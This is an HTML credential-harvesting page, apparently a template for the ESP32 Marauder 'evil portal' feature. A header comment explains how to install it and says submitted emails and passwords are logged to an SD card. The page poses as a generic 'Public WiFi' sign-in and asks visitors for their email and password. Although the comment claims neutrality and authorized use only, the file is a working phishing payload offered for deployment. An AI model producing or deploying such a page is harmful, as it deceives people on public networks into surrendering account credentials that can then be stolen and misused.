<!-- generic_hotspot_light.html -- NEUTRAL light-theme public-hotspot captive portal.
     Does NOT impersonate any real company. Self-contained, ~3 KB. Form POSTs to
     /get with email/password (Marauder logs to evil_portal_x.log on SD).
     Rename to index.html on the SD root, or `evilportal -c sethtml generic_hotspot_light.html`.
     AUTHORIZED USE ONLY. -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Public WiFi</title>
<style>
  * { box-sizing:border-box; }
  body { margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
         background:#f1f5f9; color:#0f172a; display:flex; min-height:100vh; align-items:center; justify-content:center; }
  .wrap { width:100%; max-width:380px; margin:16px; background:#fff; border-radius:16px;
          padding:32px 26px; box-shadow:0 10px 30px rgba(2,6,23,.12); }
  .brand { display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:18px; }
  .brand svg { width:26px; height:26px; }
  .brand span { font-size:18px; font-weight:700; letter-spacing:.2px; }
  h1 { font-size:17px; font-weight:600; margin:0 0 4px; text-align:center; }
  p.sub { margin:0 0 22px; text-align:center; color:#64748b; font-size:13px; }
  label { display:block; font-size:12px; color:#475569; margin-bottom:6px; }
  input { width:100%; padding:12px; margin-bottom:16px; border:1px solid #cbd5e1; border-radius:10px;
          font-size:15px; color:#0f172a; }
  input:focus { outline:none; border-color:#2563eb; box-shadow:0 0 0 3px rgba(37,99,235,.15); }
  button { width:100%; padding:13px; border:0; border-radius:10px; background:#2563eb; color:#fff;
           font-size:15px; font-weight:600; cursor:pointer; }
  .fine { margin-top:16px; text-align:center; color:#94a3b8; font-size:11px; }
</style>
</head>
<body>
  <div class="wrap">
    <div class="brand">
      <svg viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2" stroke-linecap="round">
        <path d="M5 12.55a11 11 0 0 1 14 0"></path><path d="M8.5 16.1a6 6 0 0 1 7 0"></path>
        <path d="M2 8.82a15 15 0 0 1 20 0"></path><line x1="12" y1="20" x2="12" y2="20"></line>
      </svg>
      <span>Public&nbsp;WiFi</span>
    </div>
    <h1>Connect to the Internet</h1>
    <p class="sub">Please sign in with your email to start your session</p>
    <form method="POST" action="/get">
      <label for="email">Email address</label>
      <input id="email" type="email" name="email" autocomplete="username" required>
      <label for="password">Password</label>
      <input id="password" type="password" name="password" autocomplete="current-password" required>
      <button type="submit">Get Online</button>
    </form>
    <p class="fine">Standard data rates and acceptable-use terms apply.</p>
  </div>
</body>
</html>
